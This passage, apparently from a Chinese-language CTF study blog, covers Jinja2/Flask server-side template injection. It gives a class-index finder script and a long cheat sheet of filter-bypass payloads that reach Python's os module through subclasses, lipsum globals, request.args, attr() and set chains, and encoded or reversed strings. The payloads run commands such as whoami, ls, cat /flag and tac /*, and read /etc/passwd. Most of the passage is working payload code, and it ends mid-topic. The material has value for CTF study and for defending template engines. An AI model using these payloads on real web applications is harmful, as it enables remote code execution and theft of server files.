<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将查找到的父类列表替换到data中 &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()</span></span><br><span class="line">data = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ......]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 在这里添加可以利用的类，下面会介绍这些类的利用方法</span></span><br><span class="line">userful_class = [<span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;os._wrap_close&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>, <span class="string">&#x27;warnings.catch_warnings&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>, <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span>)</span><br><span class="line">class_list = re.findall(pattern, data)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> class_list:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> userful_class:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(class_list.index(c)) + <span class="string">&quot;: &quot;</span> + c)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>做题流程也很明确了：确定好要用SSTI打RCE之后用burp（payload：<code>&quot;&quot;.__class__.__mro__[1].__subclasses__()</code>）fuzz服务器找os或者file，然后读取文件或RCE</p>
<p><strong>总结一下就是：先找object基类，然后subclasses出所有的类（就应该是一大坨玩意）然后放上面那个脚本里跑索引。找到能用的类之后去网上找这个类对应的payload打就完了）</strong></p>
<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><h4 id="过滤了两个大括号"><a href="#过滤了两个大括号" class="headerlink" title="过滤了两个大括号"></a>过滤了两个大括号</h4><p>可以直接<code>&#123;%print()%&#125;</code>替代，上文有介绍，与<code>&#123;&#123;...&#125;&#125;</code>同等效果，想看回显可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(7*7)%&#125;</span><br></pre></td></tr></table></figure>
<p>也可以使用flask控制语句<code>&#123;%...%&#125;</code>以<code>&#123;%end%&#125;</code>结尾(括号内可控制语句,定义变量,写循环判断)</p>
<p>于是使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%if().__class__%&#125;123&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>
<p>如果<code>__class__</code>类下存在内容就输出123</p>
<p>你甚至可以用循环来查找可以用的类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in. class.base_subclasses () %&#125;&#123;% if c.__name__==&#x27;catch warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;] .eval(&#x27;__import__(&quot;os&quot;).popen(&quot;&lt;command&gt;&quot;).read()&#x27;)&#125;&#125;&#123;% endif%&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">% 是模板引擎（如 Jinja2）中的一个特殊字符，用于标记模板代码的开始和结束</span><br><span class="line">&#123;% for c in class.base_subclasses() %&#125;：这是一个循环语句，它遍历class的所有基类（父类）的子类</span><br><span class="line">&#123;% if c.__name__==&#x27;catch warnings&#x27;%&#125;：这是一个条件判断语句，它检查当前遍历到的子类的名称是否是&#x27;catch warnings&#x27;</span><br><span class="line">c.__init__.__globals__：获取当前类__init__方法的全局变量字典</span><br><span class="line">[&#x27;__builtins__&#x27;]：从全局变量字典中获取内置模块的引用</span><br><span class="line">eval(&#x27;__import__(&quot;os&quot;).popen(&quot;&lt;command&gt;&quot;).read()&#x27;)：使用eval函数执行一个字符串形式的Python表达式。这个表达式首先导入os模块，然后使用popen函数执行一个系统命令（&lt;command&gt;应被替换为实际的命令），并读取命令的输出结果</span><br><span class="line">&#123;% endif %&#125;：结束条件判断语句</span><br><span class="line">&#123;% endfor %&#125;：结束循环语句</span><br></pre></td></tr></table></figure>
<h4 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;__glo&quot;+&quot;bal__&quot; == &quot;__global__&quot;</span><br></pre></td></tr></table></figure>
<h4 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了 ."></a>过滤了 .</h4><p><code>[]</code>替代</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.b == a[<span class="string">&#x27;b&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h3 id="request-args逃逸"><a href="#request-args逃逸" class="headerlink" title="request.args逃逸"></a>request.args逃逸</h3><p>如果题目中没有过滤request，则可以将一些含有敏感字符的位置用get传，再在SSTI中用request.args.arg1逃逸到get参数里去</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request.args.name</span><br><span class="line">request.cookies.name</span><br><span class="line">request.headers.name</span><br><span class="line">request.values.name</span><br><span class="line">request.form.name</span><br></pre></td></tr></table></figure>
<p><strong>GET</strong> (用<strong>request.args</strong>)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=<span class="built_in">open</span>&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure>
<p><strong>POST</strong> (用<strong>request.values</strong>)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;</span><br><span class="line">post:arg1=<span class="built_in">open</span>&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure>
<h4 id="过滤了-1"><a href="#过滤了-1" class="headerlink" title="过滤了 []"></a>过滤了 []</h4><p><strong>.getitem</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tuple[<span class="number">0</span>] == tuple.<span class="built_in">getitem</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><strong>.pop</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__subclasses__()[128] = __subclasses__().pop(128)</span><br></pre></td></tr></table></figure>
<p>E.g</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原payload，可以使用__base__绕过__bases__[0]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="comment"># 通过__getitem__()绕过__bases__[0]、通过pop(128)绕过__subclasses__()[128]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">128</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原payload</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)</span><br><span class="line"><span class="comment"># 绕过</span></span><br><span class="line">[].__class__.__base__.__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><code>pop</code> 是列表的一个方法，用于移除列表中的元素并返回该元素。这里 <code>pop(128)</code> 表示从列表中移除并返回索引为 128 的元素</p>
<h4 id="过滤了-config"><a href="#过滤了-config" class="headerlink" title="过滤了 config"></a>过滤了 config</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕过，同样可以获取到config</span></span><br><span class="line">&#123;&#123;<span class="variable language_">self</span>.<span class="built_in">dict</span>._TemplateReference__context.config&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>用内置函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="过滤了-init"><a href="#过滤了-init" class="headerlink" title="过滤了__init__"></a>过滤了<code>__init__</code></h4><p>用<code>__enter__</code>或者<code>__exit__</code>替代</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="过滤了os"><a href="#过滤了os" class="headerlink" title="过滤了os"></a>过滤了os</h4><p>可以使用翻转字符的方法，比如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]).popen</span><br></pre></td></tr></table></figure>
<p>这跟<code>__import__(&#39;os&#39;).popen</code>等效</p>
<h4 id="编码过滤"><a href="#编码过滤" class="headerlink" title="编码过滤"></a>编码过滤</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以下皆为 &quot;&quot;[&quot;__class__&quot;] 等效形式</span></span><br><span class="line"><span class="comment"># 八进制</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>]</span><br><span class="line"><span class="comment"># 十六进制</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>]</span><br><span class="line"><span class="comment"># Unicode</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>实战下就可以是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;so&quot;</span>[::-<span class="number">1</span>])|attr(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)())%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat /flag&quot;)|attr(&quot;read&quot;)())%&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="一些高端的∞"><a href="#一些高端的∞" class="headerlink" title="一些高端的∞"></a>一些高端的∞</h3><p>展示些高端玩法（）</p>
<h4 id="内置类-Undefined"><a href="#内置类-Undefined" class="headerlink" title="内置类 Undefined"></a>内置类 Undefined</h4><p>在渲染<code>().__class__.__base__.__subclasses__().c.__init__</code>初始化一个类时，此处由于不存在c类理论上应该报错停止执行，但是实际上并不会停止执行，这是由于Jinja2内置了<strong>Undefined</strong>类型，渲染结果显示为<code>&lt;class &#39;jinja2.runtime.Undefined&#39;&gt;</code>，所以看起来并不存在的c类实际上触发了内置的<strong>Undefined</strong>类型</p>
<p>可用payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a.__init__.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;C:\Windows\win.ini&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">a.__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">print</span>(g.pop.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]).popen(<span class="string">&#x27;tac /*&#x27;</span>).read())%&#125;</span><br></pre></td></tr></table></figure>
<h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/latest/templates/#filters">Template Designer 文档 — Jinja 文档 （3.2.x）</a></p>
<p>在 Jinja2 中，过滤器（Filters）用于对变量进行转换或格式化。过滤器可以用来修改变量的值，使其符合特定的格式或需求。过滤器在模板中使用管道符号 <code>|</code> 进行应用，可以链式调用多个过滤器</p>
<p>假设我们有以下模板变量：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">context = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;miHoYo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;items&#x27;</span>: [<span class="string">&#x27;zzz&#x27;</span>, <span class="string">&#x27;starrailway&#x27;</span>, <span class="string">&#x27;genshin&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;price&#x27;</span>: <span class="number">42.5</span>,</span><br><span class="line">    <span class="string">&#x27;now&#x27;</span>: datetime.now()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>常用过滤器</strong></p>
<ol>
<li><p><strong><code>default</code></strong>：为变量提供默认值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; undefined_variable|default(&quot;No value&quot;) &#125;&#125;  &#123;# 输出：No value #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>length</code></strong>：获取列表或字符串的长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; items|length &#125;&#125;  &#123;# 输出：3 #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>lower</code></strong>、<strong><code>upper</code></strong>、<strong><code>title</code></strong>：转换字符串的大小写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; name|lower &#125;&#125;  &#123;# 输出：mihoyo #&#125;</span><br><span class="line">&#123;&#123; name|upper &#125;&#125;  &#123;# 输出：MIHOYO #&#125;</span><br><span class="line">&#123;&#123; name|title &#125;&#125;  &#123;# 输出：miHoYo #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>join</code></strong>：将列表元素连接成字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; items|join(&quot;, &quot;) &#125;&#125;  &#123;# 输出：zzz, starrailway, genshin #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>replace</code></strong>：替换字符串中的子串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &quot;Hello World&quot;|replace(&quot;World&quot;, &quot;Jinja2&quot;) &#125;&#125;  &#123;# 输出：Hello Jinja2 #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>format</code></strong>：格式化字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &quot;Price: %.2f&quot;|format(price) &#125;&#125;  &#123;# 输出：Price: 42.50 #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>select</code></strong>、<strong><code>reject</code></strong>：选择或排除列表中的元素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; items|select(&quot;startswith&quot;, &quot;z&quot;)|list &#125;&#125;  &#123;# 输出：[&#x27;zzz&#x27;] #&#125;</span><br><span class="line">&#123;&#123; items|reject(&quot;endswith&quot;, &quot;z&quot;)|list &#125;&#125;  &#123;# 输出：[&#x27;starrailway&#x27;, &#x27;genshin&#x27;] #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>date</code></strong>：格式化日期</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; now|date(&quot;%Y-%m-%d %H:%M:%S&quot;) &#125;&#125;  &#123;# 输出：当前日期和时间 #&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>多个过滤器链式调用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; items|length|default(0) &#125;&#125;  &#123;# 如果 items 是 None 或空的，输出 0 #&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们着重看看 <strong>set</strong> 和 <strong>attr()</strong></p>
<hr>
<h5 id="set"><a href="#set" class="headerlink" title="set"></a>set</h5><p><code>set</code> 过滤器在 Jinja2 中用于定义和赋值变量</p>
<p>先来看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set one = dict(c=a) | join | count %&#125;</span><br></pre></td></tr></table></figure>
<p><strong><code>dict(c=a)</code></strong></p>
<ul>
<li><strong>作用</strong>：创建一个字典，键是字符串 <code>&quot;c&quot;</code>，值是变量 <code>a</code></li>
<li><strong>示例</strong>：如果 <code>a</code> 的值是 <code>&quot;test&quot;</code>，那么 <code>dict(c=a)</code> 的结果是 <code>&#123;&quot;c&quot;: &quot;test&quot;&#125;</code></li>
</ul>
<p>那我们可以用这个构造：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a = <span class="built_in">dict</span>(po=a,p=a)|join %&#125;  &#123;<span class="comment"># 构造 &#x27;pop&#x27; #&#125;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> b = ( ()|select|string|<span class="built_in">list</span> )|attr(a)(<span class="number">24</span>) %&#125;  &#123;<span class="comment"># 构造 &#x27;_&#x27; #&#125;</span></span><br></pre></td></tr></table></figure>
<p>当然你要是构造不出  <code>_</code> 可以直接入手找 <code>_</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> one=<span class="built_in">dict</span>(c=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> two=<span class="built_in">dict</span>(cc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> three=<span class="built_in">dict</span>(ccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> four=<span class="built_in">dict</span>(cccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> five=<span class="built_in">dict</span>(ccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> six=<span class="built_in">dict</span>(cccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> seven=<span class="built_in">dict</span>(ccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eight=<span class="built_in">dict</span>(cccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> nine=<span class="built_in">dict</span>(ccccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> xxx=(lipsum|string|<span class="built_in">list</span>)%&#125;&#123;%<span class="built_in">print</span> xxx%&#125;</span><br></pre></td></tr></table></figure>
<p>数数看看<code>_</code>在第几个，然后拼接</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">拼接数字为<span class="number">24</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">set</span> one=<span class="built_in">dict</span>(c=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> two=<span class="built_in">dict</span>(cc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> three=<span class="built_in">dict</span>(ccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> four=<span class="built_in">dict</span>(cccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> five=<span class="built_in">dict</span>(ccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> six=<span class="built_in">dict</span>(cccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> seven=<span class="built_in">dict</span>(ccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eight=<span class="built_in">dict</span>(cccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> nine=<span class="built_in">dict</span>(ccccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> xxx=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(three*eight)%&#125;&#123;%<span class="built_in">print</span> xxx%&#125;</span><br></pre></td></tr></table></figure>
<p>其余情况可以构造一个链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set a = dict(po=a,p=a)|join %&#125;  &#123;# 构造 &#x27;pop&#x27; #&#125;</span><br><span class="line">&#123;% set b = dict(glo=a, bals=a)|join %&#125;  &#123;# 构造 &#x27;globals&#x27; #&#125;</span><br><span class="line">&#123;% set c = dict(geti=a, tem=a)|join %&#125;  &#123;# 构造 &#x27;getitem&#x27; #&#125;</span><br><span class="line">&#123;% set d = dict(po=a, pen=a)|join %&#125;  &#123;# 构造 &#x27;popen&#x27; #&#125;</span><br><span class="line">&#123;% set e = dict(rea=a, d=a)|join %&#125;  &#123;# 构造 &#x27;read&#x27; #&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; lipsum|attr(b)|attr(c)(dict(o=a,s=a)|join)|attr(d)(dict(l=a,s=a)|join)|attr(e)() &#125;&#125;</span><br></pre></td></tr></table></figure>
<p><code>lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></p>
<hr>
<h5 id="attr"><a href="#attr" class="headerlink" title="attr()"></a>attr()</h5><p>当某些字符如点号 (<code>.</code>)、中括号 (<code>[]</code>) 或引号被过滤时</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>) &#125;&#125;  <span class="comment"># 相当于 &#123;&#123; &#x27;&#x27;.__class__ &#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>链式调用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">77</span>) &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#123;&#x27;&#x27;__class__.__base__.__subclasses__()[77]&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<hr>
<h4 id="lipsum"><a href="#lipsum" class="headerlink" title="lipsum"></a>lipsum</h4><p><code>lipsum</code> 是一个全局的函数或变量，它通常用于生成随机文本，但在 SSTI 攻击中，它也可以被用来获取内置模块或函数</p>
<p><code>ipsum.__globals__</code> 是一个字典，包含了在 <code>lipsum</code> 函数定义时的全局变量。在 Jinja2 模板中，如果 <code>lipsum</code> 存在，攻击者可以利用它来访问全局变量，如 <code>__builtins__</code>、<code>os</code> 等模块</p>
<p>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>使用 <code>popen</code> 方法执行命令 <code>ls</code>，并调用 <code>read()</code> 方法读取输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>通过 <code>__import__</code> 函数导入 <code>os</code> 模块，进而执行命令</p>
<p>那么结合一下前面的内容可以字符串拼接绕过</p>
